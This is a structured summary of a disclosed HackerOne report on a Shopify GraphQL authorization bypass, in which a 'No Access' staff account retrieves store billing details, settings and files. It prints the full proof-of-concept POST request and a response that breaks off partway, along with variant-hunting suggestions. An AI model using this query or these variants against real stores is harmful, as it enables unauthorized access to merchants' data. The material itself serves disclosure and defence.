# GraphQL LiveView Operation Authorization Bypass - No Access Users Can Access Store Settings and Data

## Metadata
- **Source:** HackerOne
- **Report:** 409973 | https://hackerone.com/reports/409973
- **Submitted:** 2018-09-15
- **Reporter:** tolo7010
- **Program:** Shopify
- **Bounty:** Not specified in report
- **Severity:** High
- **Vuln:** Authorization Bypass, Broken Access Control, Information Disclosure, Improper Permission Enforcement
- **CVEs:** None
- **Category:** web-api

## Summary
The GraphQL LiveView operation in Shopify's admin API fails to properly enforce permission checks before returning sensitive store data. Users with 'No Access' permissions could query the shop schema directly and retrieve billing addresses, store settings, product images with URLs, uploaded files, and other sensitive information that should be restricted.

## Attack scenario
1. Attacker creates or compromises a staff account assigned 'No Access' permissions on a target Shopify store
2. Attacker authenticates to the admin API using the no-access account credentials
3. Attacker crafts a GraphQL POST request to /admin/api/graphql with a LiveView operation querying the complete Shop schema
4. Attacker includes sensitive fields in the query string such as billingAddress, productImages, uploadedImages, and searchFilters
5. Server processes the GraphQL query without validating the user's permission level against requested fields
6. API returns full sensitive data including billing address, store configuration, product images with URLs, and file listings despite user having no access permissions

## Root cause
The GraphQL LiveView operation implementation does not perform field-level authorization checks. Permission validation likely occurs only at the endpoint level or for specific operations, but the LiveView query resolver fails to enforce permissions when resolving individual Shop schema fields. The backend trusts that any authenticated user can access all fields in the Shop type without verifying their permission level for each field.

## Attacker mindset
An insider threat or compromised low-privilege account holder could enumerate store data without legitimate access rights. The attacker recognizes that GraphQL exposes the full schema and attempts to exploit the gap between endpoint-level and field-level authorization to extract sensitive business information, billing details, and product data that should be restricted by role-based access controls.

## Defensive takeaways
- Implement field-level authorization checks in GraphQL resolvers, not just operation-level checks
- Validate user permissions against each field being resolved before returning data
- Use GraphQL schema directives or middleware to enforce permission policies consistently across all resolvers
- Implement permission scopes at the finest granularity (individual fields/types) rather than broad endpoint permissions
- Regularly audit GraphQL operations to ensure permission checks are comprehensive and test with low-privilege accounts
- Apply the principle of least privilege - default to denying access and explicitly grant permissions rather than the reverse
- Add logging and monitoring for unauthorized field access attempts in GraphQL queries

## Variant hunting
Test other GraphQL operations (mutations, subscriptions) for similar authorization bypass vulnerabilities
Attempt to query other root types (Product, Order, Customer) with no-access accounts to identify which types lack permission enforcement
Check if nested field access bypasses permissions (e.g., accessing sensitive data through indirect relationships)
Test permission bypass in batch queries where multiple operations are combined in a single request
Investigate if deeply nested GraphQL queries can access restricted data through traversal of relationships
Check REST API endpoints for similar authorization gaps with no-access users
Test other low-privilege roles (view-only, limited scopes) to find additional authorization bypass opportunities

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application (GraphQL endpoint exploitation)
- T1526 - Enumerate External Targets (discovering exposed schema and accessible fields)
- T1078 - Valid Accounts (using compromised/low-privilege account)
- T1087 - Account Discovery (identifying no-access account permissions)
- T1530 - Data from Cloud Storage (accessing cloud-stored billing and product data)

## Notes
This vulnerability demonstrates the importance of implementing authorization at multiple layers in GraphQL APIs. The attacker leveraged the power of GraphQL's query language to request exactly the fields they wanted without triggering permission checks. The LiveView operation name suggests this was a specialized operation for real-time data viewing, which may have had less rigorous permission validation than standard operations. The vulnerability affected sensitive business data including billing addresses and product inventory details, making it a high-severity issue requiring immediate patching.

## Full report
<details><summary>Expand</summary>

## Summary

GraphQL LiveView operation doesn't properly check for permissions before returning data. This allows "No Access"  users to access some store settings and data by providing complete Shop schema fields in the request string.

## Steps to reproduce

1. Log into an attacker account of a test store that has no any access permissions ("No Access"), e.g: `attacker1` on `h1teststore2.myshopify.com`.
2. Direct request to the following endpoint, the server will return store basic billing address, various store settings, uploaded product images with URL locations and product IDs, and the list of uploaded files of the store:

Request:

```
POST /admin/api/graphql HTTP/1.1
Host: h1teststore2.myshopify.com
Connection: close
Content-Length: 1554
accept: application/json
Origin: null
X-Shopify-Web-Force-Proxy: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36
content-type: application/json
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,th;q=0.8,lo;q=0.7
Cookie: ...

{"operationName":"LiveView","variables":{},"query":"query LiveView {\n shop {\n id, billingAddress {\n address1, address2, city, company, country, firstName, lastName, latitude, longitude, name, phone, province, zip, __typename}\n, checkoutApiSupported, countriesInShippingZones {\n countryCodes, includeRestOfWorld}\n, currencyCode, customerAccounts, description, email, features {\n branding, captcha, captchaExternalDomains, dynamicRemarketing, giftCards, harmonizedSystemCode, liveView, multiLocation, onboardingVisual, reports, showMetrics, storefront, __typename}\n, __typename, ianaTimezone, myshopifyDomain, name, navigationSettings {\n id, title, url}\n, paymentSettings {\n supportedDigitalWallets}\n, plan {\n displayName, partnerDevelopment, shopifyPlus}\n, primaryDomain {\n host, id, sslEnabled, url}\n, publicationCount, resourceLimits {\n maxProductOptions, maxProductVariants, redirectLimitReached, skuResourceLimits {\n available, quantityAvailable, quantityLimit, quantityUsed}\n}\n, richTextEditorUrl, searchFilters {\n productAvailability {\n label, value}\n}\n, setupRequired, shipsToCountries, shopifyPaymentsAccount {\n balance {\n amount, currencyCode}\n, id}\n, taxShipping, taxesIncluded, timezoneOffset, timezoneOffsetMinutes, url, weightUnit, productImages(first:0) {\n edges {\n node {\n id, originalSrc, altText}\n}\n}\n, search(first:0, query: \"p\") {\n edges {\n cursor, node {\n description }\n}\n, resultsAfterCount}      uploadedImages(first:0) {\n edges {\n cursor, node {\n altText, id, originalSrc }\n}\n} }\n}\n"}
```

Response:

```
HTTP/1.1 200 OK
Server: nginx
Date: Sat, 15 Sep 2018 02:29:03 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 8754
Connection: close
X-Sorting-Hat-PodId: 21
X-Sorting-Hat-PodId-Cached: 0
X-Sorting-Hat-ShopId: 1472954390
X-Sorting-Hat-PrivacyLevel: default
X-Sorting-Hat-FeatureSet: default
X-Sorting-Hat-Section: pod
X-Sorting-Hat-ShopId-Cached: 0
content-security-policy: default-src 'self' data: blob: 'unsafe-inline' 'unsafe-eval' https://* shopify-pos://*; block-all-mixed-content; child-src 'self' https://* shopify-pos://*; connect-src 'self' wss://* https://*; frame-ancestors 'none'; script-src https://cdn.shopify.com https://checkout.shopifycs.com https://js-agent.newrelic.com https://bam.nr-data.net https://dme0ih8comzn4.cloudfront.net https://api.stripe.com https://mpsnare.iesnare.com https://appcenter.intuit.com https://www.paypal.com https://maps.googleapis.com https://stats.g.doubleclick.net https://www.google-analytics.com https://v.shopify.com https://widget.intercom.io https://js.intercomcdn.com 'self' 'unsafe-inline' 'unsafe-eval'; upgrade-insecure-requests; report-uri /csp-report?source%5Baction%5D=query&source%5Bapp%5D=Shopify&source%5Bcontroller%5D=admin%2Fgraphql&source%5Bsection%5D=admin_api&source%5Buuid%5D=6ed70c38-5739-4999-810f-fc2171ec530d
x-xss-protection: 1; mode=block; report=/xss-report?source%5Baction%5D=query&source%5Bapp%5D=Shopify&source%5Bcontroller%5D=admin%2Fgraphql&source%5Bsection%5D=admin_api&source%5Buuid%5D=6ed70c38-5739-4999-810f-fc2171ec530d
X-Frame-Options: DENY
x-download-options: noopen
x-content-type-options: nosniff, nosniff
strict-transport-security: max-age=63072000; includeSubDomains; preload
referrer-policy: origin-when-cross-origin
vary: Accept-Encoding
Set-Cookie: X-Shopify-Access-Token=; path=/admin; expires=Thu, 01 Jan 1970 00:00:00 GMT; secure; httponly
Cache-Control: no-cache,no-store,must-revalidate,max-age=0
x-shopid: 1472954390
x-shardid: 21
x-stats-userid: 23136665622
x-stats-apiclientid: 1830279
x-stats-apipermissionid: 75287658518
server-timing: socket_queue;dur=0, edge;dur=10, processing;dur=613, util;dur=0.3125
x-permitted-cross-domain-policies: none
x-dc: chi2,chi2,gcp-us-central1,gke
X-Request-ID: 6ed70c38-5739-4999-810f-fc2171ec530d
Set-Cookie: X-Shopify-Access-Token.sig=IlV0-Jc8m2C_RkbQ2MNKkjCfsq4; path=/admin; expires=Thu, 01 Jan 1970 00:00:00 GMT; secure; httponly
X-Content-Type-Options: nosniff

{
  "data": {
    "shop": {
      "id": "gid://shopify/Shop/1472954390",
      "billingAddress": {
        "address1": "250 Saint Joseph St",
        "address2": "hhhhhhhhh",
        "city": "Mobile",
        "company": "l1",
        "country": "United States",
        "firstName": null,
        "lastName": null,
        "latitude": 30.6967006,
        "longitude": -88.04352519999999,
        "name": "",
        "phone": "1234567890",
        "province": "Alabama",
        "zip": "36601",
        "__typename": "MailingAddress"
      },
      "checkoutApiSupported": true,
      "countriesInShippingZones": {
        "countryCodes": [
          "LA"
        ],
        "includeRestOfWorld": true
      },
      "currencyCode": "USD",
      "customerAccounts": "DISABLED",
      "description": "",
      "email": "tolo7010+1@wearehackerone.com",
      "features": {
        "branding": "SHOPIFY",
        "captcha": true,
        "captchaExternalDomains": false,
        "dynamicRemarketing": false,
        "giftCards": true,
        "harmonizedSystemCode": false,
        "liveView": true,
        "multiLocation": false,
        "onboardingVisual": true,
        "reports": true,
        "showMetrics": true,
        "storefront": true,
        "__typename": "ShopFeatures"
      },
      "__typename": "Shop",
      "ianaTimezone": "Etc/GMT+12",
      "myshopifyDomain": "h1teststore2.myshopify.com",
      "name": "h1teststore2",
      "navigationSettings": [
        {
          "id": "general",
          "title": "General",
          "url": "https://h1teststore2.myshopify.com/admin/settings/general"
        },
        {
          "id": "payments",
          "title": "Payments",
          "url": "https://h1teststore2.myshopify.com/admin/settings/payments"
        },
        {
          "id": "checkout",
          "title": "Checkout",
          "url": "https://h1teststore2.myshopify.com/admin/settings/checkout"
        },
        {
          "id": "shipping",
          "title": "Shipping",
          "url": "https://h1teststore2.myshopify.com/admin/settings/shipping"
        },
        {
          "id": "taxes",
          "title": "Taxes",
          "url": "https://h1teststore2.myshopify.com/admin/settings/taxes"
        },
        {
          "id": "notifications",
          "title": "Notifications",
          "url": "https://h1teststore2.myshopify.com/admin/settings/notifications"
        },
        {
          "id": "gift_cards",
          "title": "Gift cards",
          "url": "https://h1teststore2.myshopify.com/admin/settings/gift_cards"
        },
        {
          "id": "files",
          "title": "Files",
          "url": "https://h1teststore2.myshopify.com/admin/settings/files"
        },
        {
          "id": "channels",
          "title": "Sales channels",
          "url": "https://h1teststore2.myshopify.com/admin/settings/channels"
        },
        {
          "id": "plan"

</details>

---
*Analysed by Claude on 2026-05-24*
